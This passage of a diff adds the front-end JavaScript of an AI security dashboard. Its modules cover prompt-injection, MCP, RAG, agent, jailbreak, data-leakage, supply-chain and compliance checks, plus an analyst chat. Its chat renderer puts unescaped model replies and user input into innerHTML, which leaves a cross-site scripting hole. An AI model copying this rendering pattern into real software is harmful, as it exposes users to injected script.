+    const initials = me.name.split(/[\s._@-]/).filter(Boolean).slice(0,2).map(w=>w[0].toUpperCase()).join('') || '?';
+    document.getElementById('nav-avatar').textContent = initials;
+    document.getElementById('s-avatar').textContent = initials;
+    document.getElementById('s-name').textContent = me.name;
+    document.getElementById('s-role').textContent = me.role === 'admin' ? '👑 Admin' : '🔍 Analyst';
+    document.getElementById('main-nav').style.display = 'flex';
+    loadDashboard();
+    initSettings();
+    initChat();
+  } catch(e) { window.location.href = '/'; }
+})();
+
+// ── Nav ───────────────────────────────────────────────────────────────────────
+function goTab(name, btn) {
+  document.querySelectorAll('.pg').forEach(p=>p.classList.remove('on'));
+  document.querySelectorAll('.ntab').forEach(b=>b.classList.remove('active'));
+  document.getElementById('pg-'+name).classList.add('on');
+  if(btn) btn.classList.add('active');
+}
+
+// ── Utils ─────────────────────────────────────────────────────────────────────
+function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function toast(msg,type='ok'){const t=document.getElementById('toast');t.textContent=msg;t.style.background=type==='err'?'#450a0a':type==='warn'?'#431407':'#0f172a';t.style.borderColor=type==='err'?'rgba(239,68,68,.5)':type==='warn'?'rgba(249,115,22,.4)':'rgba(255,255,255,.12)';t.classList.add('show');setTimeout(()=>t.classList.remove('show'),3000);}
+function sevBadge(s){const m={critical:'badge-crit',high:'badge-high',medium:'badge-med',low:'badge-low',none:'badge-none',weak:'badge-crit',moderate:'badge-high',strong:'badge-low',very_strong:'badge-low'};return`<span class="badge ${m[s]||'badge-none'}">${s||'unknown'}</span>`;}
+async function apiFetch(path,opts={}){return fetch(path,{...opts,headers:{'Content-Type':'application/json',...(opts.headers||{})},credentials:'same-origin'});}
+function setBtn(id,loading,txt){const b=document.getElementById(id);b.disabled=loading;b.innerHTML=loading?'<div class="spin"></div> Scanning…':txt;}
+
+// ── Dashboard ─────────────────────────────────────────────────────────────────
+async function loadDashboard(){
+  const r=await apiFetch('/api/dashboard');const d=await r.json();
+  document.getElementById('d-total').textContent=d.totalScans||0;
+  document.getElementById('d-crit').textContent=d.criticalAlerts||0;
+  document.getElementById('d-high').textContent=d.highAlerts||0;
+  document.getElementById('d-today').textContent=d.scansToday||0;
+  const al=document.getElementById('dash-alerts');
+  if(!d.recentAlerts?.length){al.innerHTML='<div class="empty" style="padding:20px"><div class="empty-icon">✅</div><div style="font-size:13px">No alerts</div></div>';}
+  else al.innerHTML=d.recentAlerts.map(a=>`<div class="finding-row"><div class="finding-icon">${a.severity==='critical'?'🔴':'🟡'}</div><div><div class="finding-title">${esc(a.type)}</div><div class="finding-desc">${esc(a.message)}</div></div>${sevBadge(a.severity)}</div>`).join('');
+  const sc=document.getElementById('dash-scans');
+  if(!d.recentScans?.length){sc.innerHTML='<div class="empty" style="padding:20px"><div style="font-size:13px">No scans yet</div></div>';}
+  else sc.innerHTML=`<div class="tbl-wrap"><table><thead><tr><th>Type</th><th>Target</th><th>Severity</th></tr></thead><tbody>${d.recentScans.map(s=>`<tr><td>${esc(s.type)}</td><td class="td-mono" style="max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(s.target)}</td><td>${sevBadge(s.severity)}</td></tr>`).join('')}</tbody></table></div>`;
+}
+
+// ── MODULE 1: Prompt Injection ────────────────────────────────────────────────
+async function runPromptInjection(){
+  const prompt=document.getElementById('pi-prompt').value.trim();
+  if(!prompt){toast('Enter a prompt to scan','err');return;}
+  setBtn('pi-btn',true,'🔍 Scan for Injection');
+  try{
+    const r=await apiFetch('/api/scan/prompt-injection',{method:'POST',body:JSON.stringify({prompt,response:document.getElementById('pi-response').value,useAI:document.getElementById('pi-ai').checked})});
+    const d=await r.json();
+    const el=document.getElementById('pi-result');
+    if(!r.ok){el.innerHTML=`<div class="alert alert-red">Error: ${esc(d.error)}</div>`;return;}
+    el.innerHTML=`
+      <div class="result-box">
+        <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+          <div style="font-size:28px">${d.severity==='critical'?'🔴':d.severity==='high'?'🟠':d.severity==='medium'?'🟡':'🟢'}</div>
+          <div><div style="font-size:16px;font-weight:800;color:#fff">${d.severity?.toUpperCase()} RISK</div>
+          <div style="font-size:12px;color:var(--text3)">Risk score: ${d.riskScore} · ${d.findings?.length||0} pattern matches</div></div>
+          ${sevBadge(d.severity)}
+        </div>
+        ${d.findings?.length?`<div style="margin-bottom:14px">${d.findings.map(f=>`<div class="finding-row"><div class="finding-icon">⚡</div><div><div class="finding-title">${esc(f.pattern)}</div><div class="finding-desc">Matched: <code style="background:rgba(0,0,0,.3);padding:1px 5px;border-radius:3px">${esc(f.matched)}</code></div></div>${sevBadge(f.severity)}</div>`).join('')}</div>`:'<div class="alert alert-green" style="margin-bottom:12px">✅ No known injection patterns detected</div>'}
+        ${d.aiAnalysis&&!d.aiAnalysis.error?`<div style="border-top:1px solid var(--border);padding-top:12px;margin-top:4px">
+          <div style="font-size:12px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px">Claude AI Analysis</div>
+          <p>${esc(d.aiAnalysis.summary||'')}</p>
+          ${d.aiAnalysis.injectionType?`<div style="margin-top:8px"><span style="font-weight:700;color:var(--text)">Injection type:</span> ${esc(d.aiAnalysis.injectionType)} · Confidence: ${esc(d.aiAnalysis.confidence)}</div>`:''}
+          ${d.aiAnalysis.remediations?.length?`<div style="margin-top:10px"><div style="font-weight:700;color:var(--text);margin-bottom:6px;font-size:12px">Remediations:</div>${d.aiAnalysis.remediations.map(r=>`<div style="font-size:12px;color:var(--text2);margin-bottom:4px">• ${esc(r)}</div>`).join('')}</div>`:''}
+        </div>`:''}
+      </div>`;
+  }catch(e){document.getElementById('pi-result').innerHTML=`<div class="alert alert-red">Error: ${esc(e.message)}</div>`;}
+  setBtn('pi-btn',false,'🔍 Scan for Injection');
+}
+
+// ── MODULE 2: MCP Auditor ─────────────────────────────────────────────────────
+async function runMCPAudit(){
+  const name=document.getElementById('mcp-name').value.trim();
+  if(!name){toast('Enter server name','err');return;}
+  let tools=[];
+  try{tools=JSON.parse(document.getElementById('mcp-tools').value||'[]');}catch(e){toast('Invalid JSON in tools field','err');return;}
+  setBtn('mcp-btn',true,'🔌 Audit MCP Server');
+  try{
+    const r=await apiFetch('/api/scan/mcp',{method:'POST',body:JSON.stringify({serverName:name,description:document.getElementById('mcp-desc').value,tools})});
+    const d=await r.json();
+    const el=document.getElementById('mcp-result');
+    if(!r.ok){el.innerHTML=`<div class="alert alert-red">${esc(d.error)}</div>`;return;}
+    el.innerHTML=`<div class="result-box">
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+        <div style="font-size:28px">${d.overallRisk==='critical'?'🔴':d.overallRisk==='high'?'🟠':d.overallRisk==='medium'?'🟡':'🟢'}</div>
+        <div><div style="font-size:16px;font-weight:800;color:#fff">${d.overallRisk?.toUpperCase()} RISK</div>
+        <div style="font-size:12px;color:var(--text3)">Risk score: ${d.riskScore}</div></div>${sevBadge(d.overallRisk)}
+      </div>
+      <p style="margin-bottom:12px">${esc(d.summary)}</p>
+      ${d.toolAudits?.length?`<div style="font-weight:700;color:var(--text);margin-bottom:8px;font-size:13px">Tool-level findings:</div>${d.toolAudits.map(t=>`<div class="finding-row"><div class="finding-icon">🔧</div><div style="flex:1"><div class="finding-title">${esc(t.toolName)}</div><div class="finding-desc">${(t.issues||[]).map(i=>`• ${esc(i)}`).join('<br>')}</div>${t.recommendation?`<div style="font-size:12px;color:var(--low-tx);margin-top:3px">→ ${esc(t.recommendation)}</div>`:''}</div>${sevBadge(t.risk)}</div>`).join('')}`:''}
+      ${d.globalIssues?.length?`<div style="margin-top:12px;font-weight:700;color:var(--text);margin-bottom:8px;font-size:13px">Global issues:</div>${d.globalIssues.map(i=>`<div style="font-size:12px;color:var(--crit-tx);margin-bottom:4px">🔴 ${esc(i)}</div>`).join('')}`:''}
+      ${d.recommendations?.length?`<div style="margin-top:12px;border-top:1px solid var(--border);padding-top:12px"><div style="font-weight:700;color:var(--text);margin-bottom:8px;font-size:12px;text-transform:uppercase;letter-spacing:.06em">Recommendations</div>${d.recommendations.map(r=>`<div style="font-size:12px;color:var(--text2);margin-bottom:4px">• ${esc(r)}</div>`).join('')}</div>`:''}
+    </div>`;
+  }catch(e){document.getElementById('mcp-result').innerHTML=`<div class="alert alert-red">${esc(e.message)}</div>`;}
+  setBtn('mcp-btn',false,'🔌 Audit MCP Server');
+}
+
+// ── MODULE 3: RAG ─────────────────────────────────────────────────────────────
+async function runRAGAssessment(){
+  const vs=document.getElementById('rag-vs').value.trim();
+  if(!vs){toast('Enter vector store name','err');return;}
+  setBtn('rag-btn',true,'📚 Assess RAG Pipeline');
+  const queries=document.getElementById('rag-queries').value.split('\n').filter(Boolean);
+  try{
+    const r=await apiFetch('/api/scan/rag',{method:'POST',body:JSON.stringify({vectorStore:vs,embeddingModel:document.getElementById('rag-em').value,retrievalStrategy:document.getElementById('rag-rs').value,accessControl:document.getElementById('rag-ac').value,dataClassification:document.getElementById('rag-dc').value,sampleQueries:queries})});
+    const d=await r.json();
+    const el=document.getElementById('rag-result');
+    if(!r.ok){el.innerHTML=`<div class="alert alert-red">${esc(d.error)}</div>`;return;}
+    el.innerHTML=`<div class="result-box">
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+        <div style="font-size:28px">${d.overallRisk==='critical'?'🔴':d.overallRisk==='high'?'🟠':d.overallRisk==='medium'?'🟡':'🟢'}</div>
+        <div><div style="font-size:16px;font-weight:800;color:#fff">${d.overallRisk?.toUpperCase()} RISK</div>
+        <div style="font-size:12px;color:var(--text3)">Poisoning: ${d.poisoningRisk} · Data leakage: ${d.dataLeakageRisk} · ACL score: ${d.accessControlScore}/100</div></div>${sevBadge(d.overallRisk)}
+      </div>
+      <p style="margin-bottom:12px">${esc(d.summary)}</p>
+      ${d.threats?.length?`${d.threats.map(t=>`<div class="finding-row"><div class="finding-icon">${t.severity==='critical'?'🔴':t.severity==='high'?'🟠':'🟡'}</div><div style="flex:1"><div class="finding-title">${esc(t.name)}</div><div class="finding-desc">${esc(t.description)}</div>${t.recommendation?`<div style="font-size:12px;color:var(--low-tx);margin-top:3px">→ ${esc(t.recommendation)}</div>`:''}</div>${sevBadge(t.severity)}</div>`).join('')}`:''}
+      ${d.quickWins?.length?`<div style="margin-top:12px;border-top:1px solid var(--border);padding-top:12px"><div style="font-size:12px;font-weight:700;color:var(--low-tx);margin-bottom:8px">✅ QUICK WINS</div>${d.quickWins.map(q=>`<div style="font-size:12px;color:var(--text2);margin-bottom:4px">• ${esc(q)}</div>`).join('')}</div>`:''}
+    </div>`;
+  }catch(e){document.getElementById('rag-result').innerHTML=`<div class="alert alert-red">${esc(e.message)}</div>`;}
+  setBtn('rag-btn',false,'📚 Assess RAG Pipeline');
+}
+
+// ── MODULE 4: Agent Monitor ───────────────────────────────────────────────────
+async function runAgentMonitor(){
+  const name=document.getElementById('ab-name').value.trim();
+  if(!name){toast('Enter agent name','err');return;}
+  let logs=[];
+  try{const raw=document.getElementById('ab-logs').value.trim();if(raw)logs=JSON.parse(raw);}catch(e){toast('Invalid JSON in logs','err');return;}
+  setBtn('ab-btn',true,'🤖 Analyse Agent Behaviour');
+  try{
+    const r=await apiFetch('/api/scan/agent-behaviour',{method:'POST',body:JSON.stringify({agentName:name,systemPrompt:document.getElementById('ab-sysprompt').value,timeWindowMinutes:parseInt(document.getElementById('ab-window').value)||60,toolCallLogs:logs})});
+    const d=await r.json();
+    const el=document.getElementById('ab-result');
+    if(!r.ok){el.innerHTML=`<div class="alert alert-red">${esc(d.error)}</div>`;return;}
+    el.innerHTML=`<div class="result-box">
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+        <div style="font-size:28px">${d.overallRisk==='critical'?'🔴':d.overallRisk==='high'?'🟠':d.overallRisk==='medium'?'🟡':'🟢'}</div>
+        <div><div style="font-size:16px;font-weight:800;color:#fff">${d.overallRisk?.toUpperCase()} RISK</div>
+        <div style="font-size:12px;color:var(--text3)">Behaviour score: ${d.behaviorScore}/100 · ${d.anomalies?.length||0} anomalies found</div></div>${sevBadge(d.overallRisk)}
+      </div>
+      <p style="margin-bottom:12px">${esc(d.summary)}</p>
+      ${d.anomalies?.length?d.anomalies.map(a=>`<div class="finding-row"><div class="finding-icon">⚠</div><div style="flex:1"><div class="finding-title">${esc(a.type)}</div><div class="finding-desc">${esc(a.description)}</div>${a.recommendation?`<div style="font-size:12px;color:var(--low-tx);margin-top:3px">→ ${esc(a.recommendation)}</div>`:''}</div>${sevBadge(a.severity)}</div>`).join(''):'<div class="alert alert-green">✅ No behavioural anomalies detected</div>'}
+      ${d.suspiciousPatterns?.length?`<div style="margin-top:12px"><div style="font-size:12px;font-weight:700;color:var(--high-tx);margin-bottom:6px">Suspicious patterns:</div>${d.suspiciousPatterns.map(p=>`<div style="font-size:12px;color:var(--text2);margin-bottom:3px">• ${esc(p)}</div>`).join('')}</div>`:''}
+    </div>`;
+  }catch(e){document.getElementById('ab-result').innerHTML=`<div class="alert alert-red">${esc(e.message)}</div>`;}
+  setBtn('ab-btn',false,'🤖 Analyse Agent Behaviour');
+}
+
+// ── MODULE 5: Jailbreak ───────────────────────────────────────────────────────
+async function runJailbreak(){
+  const prompt=document.getElementById('jb-prompt').value.trim();
+  if(!prompt){toast('Enter your system prompt','err');return;}
+  setBtn('jb-btn',true,'🎯 Run Red Team Tests');
+  try{
+    const r=await apiFetch('/api/scan/jailbreak',{method:'POST',body:JSON.stringify({systemPrompt:prompt,targetModel:document.getElementById('jb-model').value})});
+    const d=await r.json();
+    const el=document.getElementById('jb-result');
+    if(!r.ok){el.innerHTML=`<div class="alert alert-red">${esc(d.error)}</div>`;return;}
+    const score=d.resilienceScore||0;
+    const pct=Math.min(100,score);
+    const color=score>=80?'#22c55e':score>=60?'#f59e0b':score>=40?'#f97316':'#ef4444';
+    el.innerHTML=`<div class="result-box">
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px">
+        <div style="font-size:28px">${score>=80?'🛡':score>=60?'🔶':score>=40?'⚠️':'💀'}</div>
+        <div style="flex:1"><div style="font-size:16px;font-weight:800;color:#fff">${d.overallResilience?.toUpperCase().replace('_',' ')} RESILIENCE</div>
+        <div style="font-size:12px;color:var(--text3)">Score: ${score}/100 · ${d.passedAttacks||0} attacks passed · ${d.failedAttacks||0} bypassed</div>
+        <div class="prog-bar" style="margin-top:6px"><div class="prog-fill" style="width:${pct}%;background:${color}"></div></div></div>
+      </div>
+      <p style="margin-bottom:14px">${esc(d.summary)}</p>
+      ${d.attackResults?.filter(a=>a.likelyBypass).length?`<div style="font-size:12px;font-weight:700;color:var(--crit-tx);margin-bottom:8px">🔴 ATTACKS THAT WOULD BYPASS YOUR PROMPT</div>${d.attackResults.filter(a=>a.likelyBypass).map(a=>`<div class="finding-row"><div class="finding-icon">💀</div><div><div class="finding-title">${esc(a.name)}</div><div class="finding-desc">${esc(a.reason)}</div></div></div>`).join('')}`:'<div class="alert alert-green" style="margin-bottom:12px">✅ All tested attacks would likely be blocked</div>'}
+      ${d.systemPromptWeaknesses?.length?`<div style="margin-top:12px"><div style="font-size:12px;font-weight:700;color:var(--high-tx);margin-bottom:6px">Weaknesses found:</div>${d.systemPromptWeaknesses.map(w=>`<div style="font-size:12px;color:var(--text2);margin-bottom:3px">• ${esc(w)}</div>`).join('')}</div>`:''}
+      ${d.hardeningRecommendations?.length?`<div style="margin-top:12px;border-top:1px solid var(--border);padding-top:12px"><div style="font-size:12px;font-weight:700;color:var(--low-tx);margin-bottom:8px">Hardening recommendations:</div>${d.hardeningRecommendations.map(r=>`<div style="font-size:12px;color:var(--text2);margin-bottom:4px">• ${esc(r)}</div>`).join('')}</div>`:''}
+    </div>`;
+  }catch(e){document.getElementById('jb-result').innerHTML=`<div class="alert alert-red">${esc(e.message)}</div>`;}
+  setBtn('jb-btn',false,'🎯 Run Red Team Tests');
+}
+
+// ── MODULE 6: Data Leakage ────────────────────────────────────────────────────
+async function runDataLeakage(){
+  const text=document.getElementById('dl-text').value.trim();
+  if(!text){toast('Enter text to scan','err');return;}
+  setBtn('dl-btn',true,'🔍 Scan for Data Leakage');
+  try{
+    const r=await apiFetch('/api/scan/data-leakage',{method:'POST',body:JSON.stringify({text,source:document.getElementById('dl-source').value||'AI output'})});
+    const d=await r.json();
+    const el=document.getElementById('dl-result');
+    if(!r.ok){el.innerHTML=`<div class="alert alert-red">${esc(d.error)}</div>`;return;}
+    el.innerHTML=`<div class="result-box">
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+        <div style="font-size:28px">${d.severity==='critical'?'🔴':d.severity==='high'?'🟠':d.severity==='medium'?'🟡':d.totalFindings?'🟢':'✅'}</div>
+        <div><div style="font-size:16px;font-weight:800;color:#fff">${d.totalFindings} DATA LEAKAGE ${d.totalFindings===1?'FINDING':'FINDINGS'}</div>
+        <div style="font-size:12px;color:var(--text3)">Scanned ${d.textLength} characters · ${esc(d.source)}</div></div>
+        ${d.severity&&d.severity!=='none'?sevBadge(d.severity):''}
+      </div>
+      ${d.findings?.length?d.findings.map(f=>`<div class="finding-row"><div class="finding-icon">${f.severity==='critical'?'🔴':f.severity==='high'?'🟠':'🟡'}</div><div style="flex:1"><div class="finding-title">${esc(f.type)} <span style="font-weight:400;color:var(--text3)">(${f.count} occurrence${f.count!==1?'s':''})</span></div>${f.samples?.length?`<div class="finding-desc">Samples: ${f.samples.map(s=>`<code style="background:rgba(0,0,0,.3);padding:1px 4px;border-radius:3px;font-size:11px">${esc(s)}</code>`).join(' ')}</div>`:''}</div>${sevBadge(f.severity)}</div>`).join(''):'<div class="alert alert-green">✅ No PII, credentials or sensitive data patterns detected</div>'}
+    </div>`;
+  }catch(e){document.getElementById('dl-result').innerHTML=`<div class="alert alert-red">${esc(e.message)}</div>`;}
+  setBtn('dl-btn',false,'🔍 Scan for Data Leakage');
+}
+
+// ── MODULE 7: Supply Chain ────────────────────────────────────────────────────
+async function runSupplyChain(){
+  const models=document.getElementById('sc-models').value.split('\n').filter(Boolean);
+  const pkgs=document.getElementById('sc-pkgs').value.split('\n').filter(Boolean);
+  const sources=document.getElementById('sc-sources').value.split('\n').filter(Boolean);
+  if(!models.length&&!pkgs.length){toast('Enter at least one model or package','err');return;}
+  setBtn('sc-btn',true,'📦 Check Supply Chain');
+  try{
+    const r=await apiFetch('/api/scan/supply-chain',{method:'POST',body:JSON.stringify({models,packages:pkgs,sources})});
+    const d=await r.json();
+    const el=document.getElementById('sc-result');
+    if(!r.ok){el.innerHTML=`<div class="alert alert-red">${esc(d.error)}</div>`;return;}
+    el.innerHTML=`<div class="result-box">
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+        <div style="font-size:28px">${d.overallRisk==='critical'?'🔴':d.overallRisk==='high'?'🟠':d.overallRisk==='medium'?'🟡':'🟢'}</div>
+        <div><div style="font-size:16px;font-weight:800;color:#fff">${d.overallRisk?.toUpperCase()} SUPPLY CHAIN RISK</div></div>${sevBadge(d.overallRisk)}
+      </div>
+      <p style="margin-bottom:12px">${esc(d.summary)}</p>
+      ${d.criticalFindings?.length?`<div class="alert alert-red" style="margin-bottom:12px">${d.criticalFindings.map(f=>`🔴 ${esc(f)}`).join('<br>')}</div>`:''}
+      ${[...(d.modelResults||[]),...(d.packageResults||[]),...(d.sourceResults||[])].map(item=>`<div class="finding-row"><div class="finding-icon">📦</div><div style="flex:1"><div class="finding-title">${esc(item.name)}</div><div class="finding-desc">${(item.issues||item.knownCVEs||[]).map(i=>`• ${esc(i)}`).join('<br>')}</div>${item.recommendation?`<div style="font-size:12px;color:var(--low-tx);margin-top:3px">→ ${esc(item.recommendation)}</div>`:''}</div>${sevBadge(item.risk)}</div>`).join('')}
+    </div>`;
+  }catch(e){document.getElementById('sc-result').innerHTML=`<div class="alert alert-red">${esc(e.message)}</div>`;}
+  setBtn('sc-btn',false,'📦 Check Supply Chain');
+}
+
+// ── MODULE 8: Compliance ──────────────────────────────────────────────────────
+async function runCompliance(){
+  const desc=document.getElementById('co-desc').value.trim();
+  if(!desc){toast('Enter application description','err');return;}
+  setBtn('co-btn',true,'📋 Generate Compliance Report');
+  const frameworks=[];
+  if(document.getElementById('co-owasp').checked)frameworks.push('OWASP-LLM');
+  if(document.getElementById('co-nist').checked)frameworks.push('NIST-AI-RMF');
+  if(document.getElementById('co-eu').checked)frameworks.push('EU-AI-ACT');
+  try{
+    const r=await apiFetch('/api/scan/compliance',{method:'POST',body:JSON.stringify({appDescription:desc,frameworks,hasRuntimeGuardrails:document.getElementById('co-guards').checked,hasRedTeaming:document.getElementById('co-red').checked,hasAuditLog:document.getElementById('co-audit').checked,hasHumanOversight:document.getElementById('co-human').checked,processesPII:document.getElementById('co-pii').checked,isHighRiskApp:document.getElementById('co-highrisk').checked})});
+    const d=await r.json();
+    const el=document.getElementById('co-result');
+    if(!r.ok){el.innerHTML=`<div class="alert alert-red">${esc(d.error)}</div>`;return;}
+    const score=d.overallComplianceScore||0;
+    const color=score>=80?'#22c55e':score>=60?'#f59e0b':'#ef4444';
+    el.innerHTML=`<div class="result-box">
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+        <div style="font-size:28px">${score>=80?'✅':score>=60?'⚠️':'🔴'}</div>
+        <div style="flex:1"><div style="font-size:16px;font-weight:800;color:#fff">${(d.complianceLevel||'').replace(/-/g,' ').toUpperCase()}</div>
+        <div style="font-size:12px;color:var(--text3)">Compliance score: ${score}/100 · Estimated remediation: ${d.estimatedEffortDays||'?'} days</div>
+        <div class="prog-bar" style="margin-top:6px"><div class="prog-fill" style="width:${Math.min(100,score)}%;background:${color}"></div></div></div>
+      </div>
+      <p style="margin-bottom:12px">${esc(d.summary)}</p>
+      ${d.owaspLLM?.filter(o=>o.status!=='pass').length?`<div style="font-size:12px;font-weight:700;color:var(--high-tx);margin-bottom:8px">OWASP LLM GAPS:</div>${d.owaspLLM.filter(o=>o.status!=='pass').map(o=>`<div class="finding-row"><div class="finding-icon">${o.status==='fail'?'🔴':'🟡'}</div><div style="flex:1"><div class="finding-title">${esc(o.id)} — ${esc(o.name)}</div><div class="finding-desc">${esc(o.gap)}</div></div><span class="badge badge-${o.priority==='high'?'crit':o.priority==='medium'?'high':'low'}">${o.priority}</span></div>`).join('')}`:''}
+      ${d.priorityActions?.length?`<div style="margin-top:12px;border-top:1px solid var(--border);padding-top:12px"><div style="font-size:12px;font-weight:700;color:var(--low-tx);margin-bottom:8px">Priority actions:</div>${d.priorityActions.map((a,i)=>`<div style="font-size:12px;color:var(--text2);margin-bottom:5px"><span style="color:#ef4444;font-weight:700;margin-right:6px">${i+1}.</span>${esc(a)}</div>`).join('')}</div>`:''}
+    </div>`;
+  }catch(e){document.getElementById('co-result').innerHTML=`<div class="alert alert-red">${esc(e.message)}</div>`;}
+  setBtn('co-btn',false,'📋 Generate Compliance Report');
+}
+
+// ── MODULE 9: AI Chat ─────────────────────────────────────────────────────────
+function initChat(){
+  const el=document.getElementById('chat-msgs');
+  if(el.children.length)return;
+  el.innerHTML=`<div class="chat-msg"><div class="msg-av ai-av">🛡</div><div class="msg-body ai-body"><strong>AI Security Analyst ready.</strong><br><br>I specialise in LLM security, agentic AI risks, MCP security, RAG pipeline threats, prompt injection, jailbreaks, OWASP LLM Top 10 (2025), NIST AI RMF and EU AI Act.<br><br>Ask me anything — or use the quick buttons above to get started.</div></div>`;
+  const warn=document.getElementById('chat-key-warn');
+  if(me?.shared_key_set){warn.innerHTML='<span class="badge badge-low">✓ Claude AI connected</span>';warn.style.display='block';}
+  else{warn.innerHTML='<span class="badge badge-crit">⚠ No API key — admin must set it in ⚙ Settings</span>';warn.style.display='block';}
+}
+function quickQ(q){document.getElementById('chat-inp').value=q;sendChat();}
+async function sendChat(){
+  const inp=document.getElementById('chat-inp'),msg=inp.value.trim();
+  if(!msg)return;inp.value='';
+  addMsg('user',msg);chatHistory.push({role:'user',content:msg});
+  const tid=addTyping();document.getElementById('chat-send').disabled=true;
+  try{
+    const r=await apiFetch('/api/chat',{method:'POST',body:JSON.stringify({messages:chatHistory.slice(-10)})});
+    removeTyping(tid);const d=await r.json();
+    if(r.ok){chatHistory.push({role:'assistant',content:d.reply});addMsg('ai',d.reply);}
+    else addMsg('ai','❌ '+esc(d.error||'Error'));
+  }catch(e){removeTyping(tid);addMsg('ai','❌ Network error');}
+  document.getElementById('chat-send').disabled=false;
+}
+function addMsg(role,text){
+  const msgs=document.getElementById('chat-msgs');
+  const div=document.createElement('div');div.className='chat-msg '+(role==='user'?'user':'');
+  const av=document.createElement('div');av.className='msg-av '+(role==='user'?'user-av':'ai-av');av.textContent=role==='user'?(me?.name?.[0]?.toUpperCase()||'U'):'🛡';
+  const body=document.createElement('div');body.className='msg-body '+(role==='user'?'user-body':'ai-body');
+  body.innerHTML=text.replace(/\n/g,'<br>').replace(/\*\*(.+?)\*\*/g,'<strong>$1</strong>').replace(/`(.+?)`/g,'<code style="background:rgba(0,0,0,.4);padding:1px 5px;border-radius:3px;font-size:12px">$1</code>');
+  div.appendChild(av);div.appendChild(body);msgs.appendChild(div);msgs.scrollTop=msgs.scrollHeight;
+}
+function addTyping(){const msgs=document.getElementById('chat-msgs');const div=document.createElement('div');div.className='chat-msg';div.id='typing-'+Date.now();div.innerHTML='<div class="msg-av ai-av">🛡</div><div class="msg-body ai-body"><div class="spin" style="width:14px;height:14px;border-width:2px"></div></div>';msgs.appendChild(div);msgs.scrollTop=msgs.scrollHeight;return div.id;}
+function removeTyping(id){const el=document.getElementById(id);if(el)el.remove();}
+
+// ── Settings ──────────────────────────────────────────────────────────────────
+function initSettings(){
+  if(!me)return;
+  const isAdmin=me.role==='admin';
+  document.getElementById('s-api-nonadmin').style.display=isAdmin?'none':'block';
+  document.getElementById('s-api-admin').style.display=isAdmin?'block':'none';
+  if(isAdmin){
+    apiFetch('/api/settings').then(r=>r.json()).then(d=>{
+      const prev=document.getElementById('s-api-preview');
+      if(d.api_key_set){prev.textContent='Current: '+d.api_key_preview;prev.style.display='block';}
+    }).catch(()=>{});
+    document.getElementById('s-users-card').style.display='block';
+    loadUsers();
+  }
+}
+async function saveApiKey(){
+  const val=document.getElementById('s-api-inp').value.trim();
+  if(!val){toast('Enter an API key','err');return;}
+  const r=await apiFetch('/api/settings',{method:'PUT',body:JSON.stringify({api_key:val})});
+  const d=await r.json();
+  const res=document.getElementById('s-api-result');
+  if(r.ok){res.textContent='✓ Saved';res.style.color='#22c55e';if(me)me.shared_key_set=true;toast('API key saved ✓');}
+  else{res.textContent='✗ '+esc(d.error);res.style.color='#ef4444';}
+}
+async function loadUsers(){
+  const r=await apiFetch('/api/users');const d=await r.json();
+  document.getElementById('s-user-list').innerHTML=d.map(u=>`<div style="display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--border)">
+    <div style="width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,#ef4444,#f97316);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:#fff;flex-shrink:0">${(u.name?.[0]||u.username?.[0]||'?').toUpperCase()}</div>
+    <div style="flex:1"><div style="font-weight:600;font-size:13px;color:var(--text)">${esc(u.name)}</div><div style="font-size:11px;color:var(--text3)">${esc(u.username)} · ${u.role}</div></div>
+    ${u.username!==me?.username?`<button class="btn btn-sm" style="color:#ef4444;border-color:rgba(239,68,68,.3)" onclick="deleteUser('${u.id}')">Remove</button>`:''}
+  </div>`).join('');
+}
+async function deleteUser(id){if(!confirm('Remove this user?'))return;await apiFetch('/api/users/'+id,{method:'DELETE'});loadUsers();}
+async function doLogout(){try{await fetch('/api/auth/logout',{method:'POST',credentials:'same-origin'});}catch(e){}window.location.href='/';}
+</script>
+</body>
+</html>
